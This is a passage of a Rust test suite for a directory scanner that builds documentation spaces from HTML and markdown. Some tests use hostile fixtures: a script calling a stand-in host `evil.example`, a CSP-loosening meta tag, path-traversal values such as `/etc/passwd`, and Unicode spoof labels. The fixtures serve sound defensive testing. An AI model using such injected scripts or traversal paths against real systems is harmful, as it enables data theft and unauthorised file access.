        assert!(matches!(r, Err(ScanError::Symlink(_))), "got {r:?}");
    }

    #[cfg(unix)]
    #[test]
    fn symlinked_root_is_rejected() {
        let d = TempDir::new();
        d.write("real/index.html", b"<h1>ok</h1>");
        let link = std::env::temp_dir().join(format!("glasspad-rootlink-{}", std::process::id()));
        let _ = std::fs::remove_file(&link);
        std::os::unix::fs::symlink(d.path().join("real"), &link).unwrap();
        let r = scan_dir(&link);
        let _ = std::fs::remove_file(&link);
        assert!(matches!(r, Err(ScanError::Symlink(_))), "got {r:?}");
    }

    #[test]
    fn manifest_nav_orders_and_titles() {
        let d = TempDir::new();
        d.write("a.html", b"<h1>A</h1>");
        d.write("b.html", b"<h1>B</h1>");
        d.write("glasspad.yaml", b"title: My Space\nnav: [b, a]\n");
        let space = scan_dir(d.path()).unwrap();
        assert_eq!(space.title.as_deref(), Some("My Space"));
        // With no index/home page, a landing `index` is generated and becomes the
        // home; the manifest nav order (b, a) follows it in the flat allowlist.
        assert_eq!(
            space.nav,
            vec!["index".to_string(), "b".to_string(), "a".to_string()]
        );
        assert_eq!(space.home.as_deref(), Some("index"));
        // The generated landing carries the space title and links both pages.
        let landing = &space.artifact("index").unwrap().html;
        assert!(landing.contains(r#"<article class="gp-prose">"#));
        assert!(landing.contains("<h1>My Space</h1>"));
        assert!(landing.contains(r#"<a href="a.html">"#));
        assert!(landing.contains(r#"<a href="b.html">"#));
    }

    #[test]
    fn malformed_manifest_is_hard_error() {
        let d = TempDir::new();
        d.write("index.html", b"<h1>x</h1>");
        d.write("glasspad.yaml", b"title: [unterminated\n");
        assert!(matches!(scan_dir(d.path()), Err(ScanError::Manifest(_, _))));
    }

    #[test]
    fn oversized_manifest_is_hard_error() {
        let d = TempDir::new();
        d.write("index.html", b"<h1>x</h1>");
        // Valid YAML, but far over the tight manifest cap — must never reach the
        // parser (alias-bomb defense).
        let big = format!(
            "title: {}\n",
            "a".repeat((MAX_MANIFEST_BYTES + 10) as usize)
        );
        d.write("glasspad.yaml", big.as_bytes());
        assert!(matches!(
            scan_dir(d.path()),
            Err(ScanError::ManifestTooLarge(_, _))
        ));
    }

    #[test]
    fn manifest_nav_dedupes_repeated_entries() {
        let d = TempDir::new();
        d.write("a.html", b"<h1>A</h1>");
        d.write("b.html", b"<h1>B</h1>");
        d.write("glasspad.yaml", b"nav: [a, a, b, a]\n");
        let space = scan_dir(d.path()).unwrap();
        // Deduped manifest order (a, b), preceded by the generated landing `index`.
        assert_eq!(
            space.nav,
            vec!["index".to_string(), "a".to_string(), "b".to_string()]
        );
    }

    // --- grouped nav + generated landing (space-docsite-nav) ---------------

    #[test]
    fn manifest_groups_reconcile_and_nest_companions() {
        // A design-v2-shaped space: grouped nav with a member carrying two companion
        // children, declared via the manifest (the documented companion-mapping
        // choice — glasspad does NOT parse dotted `x.arkkitehdille.md` stems; the
        // producer ships slug-safe pages + this mapping).
        let d = TempDir::new();
        d.write("intent.md", b"# Intent\n\nWhy we build it.\n");
        d.write("backtest.md", b"# Backtest\n\nThe analysis.\n");
        d.write("backtest-arkkitehdille.md", b"# For the architect\n");
        d.write("backtest-kirjanpitajalle.md", b"# For the accountant\n");
        d.write(
            "glasspad.yaml",
            b"title: Design v2\n\
              groups:\n\
              \x20 - label: Perusarkkitehtuuri\n\
              \x20   members:\n\
              \x20     - intent\n\
              \x20 - label: Suunnitteludokumentit\n\
              \x20   members:\n\
              \x20     - slug: backtest\n\
              \x20       title: Backtest-analyysi\n\
              \x20       children:\n\
              \x20         - backtest-arkkitehdille\n\
              \x20         - backtest-kirjanpitajalle\n",
        );
        let space = scan_dir(d.path()).unwrap();

        // Two groups survive reconciliation, in manifest order.
        assert_eq!(space.nav_groups.len(), 2);
        assert_eq!(space.nav_groups[0].label, "Perusarkkitehtuuri");
        assert_eq!(space.nav_groups[0].members[0].slug, "intent");
        let design = &space.nav_groups[1];
        assert_eq!(design.label, "Suunnitteludokumentit");
        assert_eq!(design.members[0].slug, "backtest");
        assert_eq!(
            design.members[0].title.as_deref(),
            Some("Backtest-analyysi")
        );
        // The two companions are nested ONE level under `backtest`.
        assert_eq!(design.members[0].children.len(), 2);
        assert_eq!(design.members[0].children[0].slug, "backtest-arkkitehdille");
        assert_eq!(
            design.members[0].children[1].slug,
            "backtest-kirjanpitajalle"
        );

        // No index/home → a landing index was generated and is the home.
        assert_eq!(space.home.as_deref(), Some("index"));
        let landing = &space.artifact("index").unwrap().html;
        assert!(landing.contains("<h1>Design v2</h1>"));
        // Grouped landing: section headings + links, companions nested in a child list.
        assert!(landing.contains("<h2>Perusarkkitehtuuri</h2>"));
        assert!(landing.contains(r#"<a href="backtest.html">Backtest-analyysi</a>"#));
        assert!(landing.contains("gp-index-children"));
        assert!(landing.contains(r#"<a href="backtest-arkkitehdille.html">"#));
        // The flat nav still contains the full allowlist (all pages + the landing).
        assert!(space.nav.contains(&"index".to_string()));
        assert!(space.nav.contains(&"backtest-kirjanpitajalle".to_string()));
    }

    #[test]
    fn manifest_groups_drop_dangling_slugs_and_empty_groups() {
        // A member slug with no matching artifact is dropped; a group left with no
        // members is dropped entirely; a duplicate slug appears only once.
        let d = TempDir::new();
        d.write("index.md", b"# Home\n");
        d.write("a.md", b"# A\n");
        d.write(
            "glasspad.yaml",
            b"groups:\n\
              \x20 - label: Real\n\
              \x20   members: [a, ghost, a]\n\
              \x20 - label: Empty\n\
              \x20   members: [nope]\n",
        );
        let space = scan_dir(d.path()).unwrap();
        assert_eq!(space.nav_groups.len(), 1);
        assert_eq!(space.nav_groups[0].label, "Real");
        assert_eq!(space.nav_groups[0].members.len(), 1);
        assert_eq!(space.nav_groups[0].members[0].slug, "a");
        // An index page exists here, so NO landing is generated (precedence kept).
        assert_eq!(space.home.as_deref(), Some("index"));
    }

    #[test]
    fn landing_description_prefers_manifest_then_first_paragraph() {
        let d = TempDir::new();
        d.write("a.md", b"# A\n\nFirst paragraph of A.\n");
        d.write("b.md", b"# B\n\nFirst paragraph of B.\n");
        d.write(
            "glasspad.yaml",
            b"groups:\n\
              \x20 - label: G\n\
              \x20   members:\n\
              \x20     - slug: a\n\
              \x20       desc: Manifest description\n\
              \x20     - b\n",
        );
        let space = scan_dir(d.path()).unwrap();
        let landing = &space.artifact("index").unwrap().html;
        // `a` uses the manifest desc; `b` falls back to its first paragraph.
        assert!(landing.contains("Manifest description"));
        assert!(!landing.contains("First paragraph of A."));
        assert!(landing.contains("First paragraph of B."));
    }

    #[test]
    fn generated_landing_is_flat_list_without_groups() {
        // No groups declared + no index → a flat landing listing every page.
        let d = TempDir::new();
        d.write("alpha.md", b"# Alpha\n");
        d.write("beta.md", b"# Beta\n");
        let space = scan_dir(d.path()).unwrap();
        assert_eq!(space.home.as_deref(), Some("index"));
        let landing = &space.artifact("index").unwrap().html;
        assert!(landing.contains(r#"<article class="gp-prose">"#));
        assert!(landing.contains(r#"<a href="alpha.html">Alpha</a>"#));
        assert!(landing.contains(r#"<a href="beta.html">Beta</a>"#));
        // The generated index never lists itself.
        assert!(!landing.contains(r#"href="index.html""#));
    }

    #[test]
    fn manifest_groups_never_widen_the_nav_allowlist() {
        // Grouped nav is DISPLAY curation only — an ungrouped page is still reachable
        // (in the flat `nav` allowlist), just not listed in the sidebar/landing.
        let d = TempDir::new();
        d.write("index.md", b"# Home\n");
        d.write("shown.md", b"# Shown\n");
        d.write("hidden.md", b"# Hidden\n");
        d.write(
            "glasspad.yaml",
            b"groups:\n - label: G\n   members: [shown]\n",
        );
        let space = scan_dir(d.path()).unwrap();
        assert_eq!(space.nav_groups[0].members.len(), 1);
        // `hidden` is not in any group but remains in the flat allowlist.
        assert!(space.nav.contains(&"hidden".to_string()));
    }

    #[test]
    fn no_groups_declared_keeps_flat_nav_fallback() {
        // Byte-compatible fallback: with no `groups:` the space carries an empty
        // nav_groups (the shell renders the flat bar unchanged).
        let d = TempDir::new();
        d.write("index.html", b"<title>Home</title><h1>hi</h1>");
        d.write("a.html", b"<h1>A</h1>");
        let space = scan_dir(d.path()).unwrap();
        assert!(space.nav_groups.is_empty());
        assert_eq!(space.home.as_deref(), Some("index"));
    }

    #[test]
    fn landing_omits_empty_group_heading() {
        // A group whose label is spoof/whitespace-only sanitizes to "" but keeps its
        // valid members; the landing must NOT emit an empty `<h2></h2>`.
        let d = TempDir::new();
        d.write("a.md", b"# A\n");
        d.write("b.md", b"# B\n");
        d.write(
            "glasspad.yaml",
            "groups:\n - label: \"\u{202e}\u{200b}\"\n   members: [a, b]\n".as_bytes(),
        );
        let space = scan_dir(d.path()).unwrap();
        assert_eq!(space.nav_groups[0].label, "");
        let landing = &space.artifact("index").unwrap().html;
        assert!(!landing.contains("<h2></h2>"));
        assert!(landing.contains(r#"<a href="a.html">"#));
    }

    #[test]
    fn manifest_group_label_and_title_are_sanitized() {
        // A bidi/zero-width spoof in a group label or member title is stripped at
        // reconciliation (identical treatment to a resolved artifact title).
        let d = TempDir::new();
        d.write("a.md", b"# A\n");
        d.write(
            "glasspad.yaml",
            "groups:\n - label: \"G\u{202e}spoof\"\n   members:\n     - slug: a\n       title: \"T\u{200b}itle\"\n".as_bytes(),
        );
        let space = scan_dir(d.path()).unwrap();
        assert_eq!(space.nav_groups[0].label, "Gspoof");
        assert_eq!(
            space.nav_groups[0].members[0].title.as_deref(),
            Some("Title")
        );
    }

    // --- markdown-native spaces (Gap 2) ------------------------------------

    #[test]
    fn markdown_dir_renders_each_md_as_an_artifact_with_stem_slug() {
        let d = TempDir::new();
        d.write("index.md", b"# Home\n\nWelcome to the [guide](./guide).\n");
        d.write("guide.md", b"# The Guide\n\nSome **bold** prose.\n");
        let space = scan_dir(d.path()).unwrap();

        assert_eq!(space.artifacts.len(), 2);
        // Slug is the filename stem; nav is lexicographic without a manifest.
        assert_eq!(space.nav, vec!["guide".to_string(), "index".to_string()]);
        assert_eq!(space.home.as_deref(), Some("index"));

        let index = space.artifact("index").unwrap();
        // Rendered through the default `prose` fragment template (base.css hardened
        // reading theme), so it is a fragment the serve path wraps + bridges.
        assert!(index.html.contains(r#"<article class="gp-prose">"#));
        assert!(index.html.contains(r#"<h1 id="home">Home</h1>"#));
        // The relative markdown link survives so same-space nav resolves.
        assert!(index.html.contains(r#"href="./guide""#));
        // Title resolves from the rendered first <h1>.
        assert_eq!(index.title, "Home");
        assert_eq!(space.artifact("guide").unwrap().title, "The Guide");
        assert!(
            space
                .artifact("guide")
                .unwrap()
                .html
                .contains("<strong>bold</strong>")
        );
    }

    #[test]
    fn markdown_and_html_coexist_in_one_space() {
        let d = TempDir::new();
        d.write("index.html", b"<title>Home</title><h1>hi</h1>");
        d.write("about.md", b"# About Us\n\nprose.\n");
        d.write("assets/data.json", b"{\"a\":1}");
        let space = scan_dir(d.path()).unwrap();

        assert_eq!(space.artifacts.len(), 2);
        // The `.html` page is served byte-for-byte verbatim (not wrapped at scan).
        assert_eq!(
            space.artifact("index").unwrap().html,
            "<title>Home</title><h1>hi</h1>"
        );
        // The `.md` page is rendered.
        assert!(
            space
                .artifact("about")
                .unwrap()
                .html
                .contains(r#"<h1 id="about-us">About Us</h1>"#)
        );
        assert!(space.asset("assets/data.json").is_some());
        assert_eq!(space.home.as_deref(), Some("index"));
    }

    #[test]
    fn markdown_and_html_same_stem_is_a_collision() {
        let d = TempDir::new();
        d.write("page.html", b"<h1>html</h1>");
        d.write("page.md", b"# markdown\n");
        assert!(matches!(
            scan_dir(d.path()),
            Err(ScanError::DuplicateSlug(_, _))
        ));
    }

    #[test]
    fn two_markdown_files_same_stem_is_a_collision() {
        let d = TempDir::new();
        d.write("page.md", b"# one\n");
        d.write("page.markdown", b"# two\n");
        assert!(matches!(
            scan_dir(d.path()),
            Err(ScanError::DuplicateSlug(_, _))
        ));
    }

    #[test]
    fn manifest_template_selects_the_builtin_for_md_pages() {
        let d = TempDir::new();
        d.write("index.md", b"# Dash\n");
        d.write("glasspad.yaml", b"template: dashboard\n");
        let space = scan_dir(d.path()).unwrap();
        // `dashboard` wraps in a `.gp-card` surface instead of `.gp-prose`.
        assert!(
            space
                .artifact("index")
                .unwrap()
                .html
                .contains(r#"class="gp-card""#)
        );
        assert!(!space.artifact("index").unwrap().html.contains("gp-prose"));
    }

    #[test]
    fn manifest_template_orders_and_resolves_regardless_of_scan_order() {
        // `about.md` sorts before `glasspad.yaml`; the template must still apply.
        let d = TempDir::new();
        d.write("about.md", b"# About\n");
        d.write("glasspad.yaml", b"template: dashboard\nnav: [about]\n");
        let space = scan_dir(d.path()).unwrap();
        assert!(
            space
                .artifact("about")
                .unwrap()
                .html
                .contains(r#"class="gp-card""#)
        );
    }

    #[test]
    fn custom_manifest_template_applies_to_every_markdown_page_and_keeps_toc() {
        let d = TempDir::new();
        d.write(
            "index.md",
            b"# Home\n\n## Start\n\nHello\n\n## Finish\n\nBye\n",
        );
        d.write("guide.md", b"# Guide\n\nBody\n");
        d.write(
            "templates/brand.html",
            b"<main class=\"brand\">{{content}}</main>",
        );
        d.write(
            "glasspad.yaml",
            b"template: ./templates/brand.html\ngroups:\n  - label: Docs\n    members: [index, guide]\n",
        );
        let space = scan_dir(d.path()).unwrap();
        for slug in ["index", "guide"] {
            assert!(
                space
                    .artifact(slug)
                    .unwrap()
                    .html
                    .contains("class=\"brand\"")
            );
        }
        // The custom template is a content fragment only: host navigation data is
        // still finalized, and pages with enough headings retain the TOC rail.
        assert_eq!(space.nav_groups[0].label, "Docs");
        let index = &space.artifact("index").unwrap().html;
        assert!(index.contains("gp-toc") && index.contains("href=\"#start\""));
        // The rail is a sibling of the producer template, never nested inside its
        // content slot (which would break a branded page's own layout).
        assert!(index.starts_with("<div class=\"gp-doc\">\n<main class=\"brand\">"));
    }

    #[test]
    fn custom_template_rejects_full_documents_and_escaping_paths() {
        let d = TempDir::new();
        d.write("index.md", b"# Hi\n");
        d.write(
            "templates/full.html",
            b"<!doctype html><html><body>{{content}}</body></html>",
        );
        d.write("glasspad.yaml", b"template: templates/full.html\n");
        assert!(matches!(
            scan_dir(d.path()),
            Err(ScanError::TemplateFullDocument(_))
        ));

        for bad in [
            "../secret.html",
            "/etc/passwd",
            "templates/../../../secret.html",
        ] {
            d.write("glasspad.yaml", format!("template: {bad}\n").as_bytes());
            assert!(
                matches!(scan_dir(d.path()), Err(ScanError::TemplatePath(_))),
                "path {bad:?} should be rejected"
            );
        }
    }

    #[test]
    fn missing_or_invalid_custom_manifest_template_is_informative() {
        let d = TempDir::new();
        d.write("index.md", b"# Hi\n");
        d.write("glasspad.yaml", b"template: templates/missing.html\n");
        assert!(matches!(
            scan_dir(d.path()),
            Err(ScanError::TemplateNotFound(_))
        ));

        let d = TempDir::new();
        d.write("index.md", b"# Hi\n");
        d.write("templates/bad.html", b"<main>no slot</main>");
        d.write("glasspad.yaml", b"template: templates/bad.html\n");
        assert!(matches!(
            scan_dir(d.path()),
            Err(ScanError::TemplateRender(_, _))
        ));
    }

    #[test]
    fn unknown_manifest_template_is_a_hard_error() {
        let d = TempDir::new();
        d.write("index.md", b"# Hi\n");
        d.write("glasspad.yaml", b"template: nonsuch\n");
        assert!(matches!(
            scan_dir(d.path()),
            Err(ScanError::UnknownTemplate(_))
        ));
    }

    #[test]
    fn reserved_and_bad_md_slugs_are_hard_errors() {
        let d = TempDir::new();
        d.write("api.md", b"# x\n"); // `api` is reserved
        assert!(matches!(
            scan_dir(d.path()),
            Err(ScanError::ReservedSlug(_, _))
        ));
        let d2 = TempDir::new();
        d2.write("Bad Name.md", b"# x\n");
        assert!(matches!(scan_dir(d2.path()), Err(ScanError::BadSlug(_, _))));
    }

    #[test]
    fn hostile_markdown_passes_through_as_inert_sandboxed_body() {
        // Raw HTML/script embedded in markdown passes through verbatim — it is
        // untrusted script inside the null-origin sandbox regardless, and the body
        // stays a fragment (no full-document boundary escape). The security boundary
        // is the CSP/sandbox on the RESPONSE, not sanitization here.
        let d = TempDir::new();
        d.write(
            "index.md",
            b"# Doc\n\n<script>fetch('http://evil.example/x')</script>\n\
              <meta http-equiv=\"Content-Security-Policy\" content=\"connect-src *\">\n",
        );
        let space = scan_dir(d.path()).unwrap();
        let body = &space.artifact("index").unwrap().html;
        // The rendered body is a fragment (wrap injects base.css + bridge.js at serve).
        assert!(super::super::wrap::is_fragment(body));
        // The script text is present but inert — it only ever runs inside the frozen
        // sandbox, and `connect-src 'none'` (set on the response) blocks the fetch.
        assert!(body.contains("evil.example"));
        assert!(body.contains(r#"<article class="gp-prose">"#));
    }

    #[test]
    fn markdown_under_assets_stays_an_asset_not_a_page() {
        // Only TOP-LEVEL `.md` files are pages; a `.md` inside `assets/` is a static
        // asset served verbatim (never rendered, never a route of its own).
        let d = TempDir::new();
        d.write("index.md", b"# Home\n");
        d.write("assets/notes.md", b"# not a page\n");
        let space = scan_dir(d.path()).unwrap();
        assert!(space.artifact("notes").is_none());
        assert!(space.asset("assets/notes.md").is_some());
        assert_eq!(space.artifacts.len(), 1); // just `index`
    }

    #[test]
    fn empty_markdown_is_a_valid_page_titled_by_stem() {
        // An empty (or whitespace-only) `.md` still renders to the non-empty template
        // wrapper and is a valid artifact; with no heading, the title falls back to
        // the slug. It must not error or panic.
        let d = TempDir::new();
        d.write("index.md", b"");
        d.write("blank.md", b"   \n\n");
        let space = scan_dir(d.path()).unwrap();
        assert_eq!(space.artifacts.len(), 2);
        assert!(space.artifact("index").unwrap().html.contains("gp-prose"));
        assert_eq!(space.artifact("index").unwrap().title, "index");
        assert_eq!(space.artifact("blank").unwrap().title, "blank");
    }

    #[test]
    fn html_page_is_served_verbatim_never_rendered_as_markdown() {
        // Regression: a `.html` page in a mixed space is byte-for-byte verbatim — it is
        // NOT run through the markdown/template render path (no prose wrapper injected).
        let d = TempDir::new();
        d.write("page.html", b"# Not A Heading\n<b>raw</b>");
        d.write("other.md", b"# Rendered\n");
        let space = scan_dir(d.path()).unwrap();
        let html = &space.artifact("page").unwrap().html;
        assert_eq!(html, "# Not A Heading\n<b>raw</b>");
        assert!(!html.contains("gp-prose"));
        assert!(!html.contains("<h1>")); // the `#` is literal, not a rendered heading
    }

    #[test]
    fn uppercase_md_stem_is_rejected_like_any_invalid_slug() {
        // Behavior lock: the slug is the filename stem *literally* (same as the `.html`
        // path), so `README.md` — stem `README`, uppercase — is a `BadSlug` hard error,
        // NOT silently lowercased. A served page must have a valid-slug filename.
        let d = TempDir::new();
        d.write("README.md", b"# Readme\n");
        assert!(matches!(scan_dir(d.path()), Err(ScanError::BadSlug(_, _))));
    }

    #[test]
    fn unknown_template_fails_fast_even_in_an_html_only_space() {
        // A mistyped `template:` is a config error surfaced immediately, even when the
        // space currently has no `.md` page that would use it (fail-fast config).
        let d = TempDir::new();
        d.write("index.html", b"<h1>hi</h1>");
        d.write("glasspad.yaml", b"template: nonsuch\n");
        assert!(matches!(
            scan_dir(d.path()),
            Err(ScanError::UnknownTemplate(_))
        ));
    }

    #[test]
    fn oversize_md_source_is_a_hard_error() {
        // A markdown source over the per-file cap is rejected on read (same cap the
        // `.html` path enforces), before any render.
        let d = TempDir::new();
        d.write("index.md", &vec![b'a'; (MAX_FILE_BYTES + 1) as usize]);
        assert!(matches!(
            scan_dir(d.path()),
            Err(ScanError::FileTooLarge(_, _))
        ));
    }

    #[test]
    fn md_space_scan_feeds_the_hosted_bundle_builder() {
        // The hosted space-publish path scans locally, then ships the rendered
        // artifact bodies to `build_space_bundle` (which re-validates them). Prove the
        // md-rendered bodies flow through that builder unchanged (same multi-page
        // hosted result an `.html` space produces).
        let d = TempDir::new();
        d.write("index.md", b"# Home\n\n[guide](./guide)\n");
        d.write("guide.md", b"# Guide\n");
        let space = scan_dir(d.path()).unwrap();

        let pages: Vec<BundlePage> = space
            .artifacts
            .iter()
            .map(|(slug, art)| BundlePage {
                slug: slug.clone(),
                html: art.html.clone(),
            })
            .collect();
        let bundle = build_space_bundle(
            pages,
            vec![],
            space.nav.clone(),
            space.nav_groups.clone(),
            space.title.clone(),
        )
        .unwrap();
        assert_eq!(bundle.artifacts.len(), 2);
        assert!(
            bundle
                .artifact("index")
                .unwrap()
                .html
                .contains(r#"<h1 id="home">Home</h1>"#)
        );
        assert_eq!(bundle.artifact("guide").unwrap().title, "Guide");
    }

    #[cfg(unix)]
    #[test]
    fn fifo_artifact_is_rejected_without_hanging() {
        use std::os::unix::net::UnixListener;
        let d = TempDir::new();
        d.write("index.html", b"<h1>ok</h1>");
        // A unix socket is a non-regular file; a FIFO would block on open, which is
        // exactly why we reject via lstat first. A socket exercises the same guard
        // without the test needing mkfifo.
        let _sock = UnixListener::bind(d.path().join("weird.html")).unwrap();
        assert!(matches!(
            scan_dir(d.path()),
            Err(ScanError::UnsupportedFileType(_))
        ));
    }
}
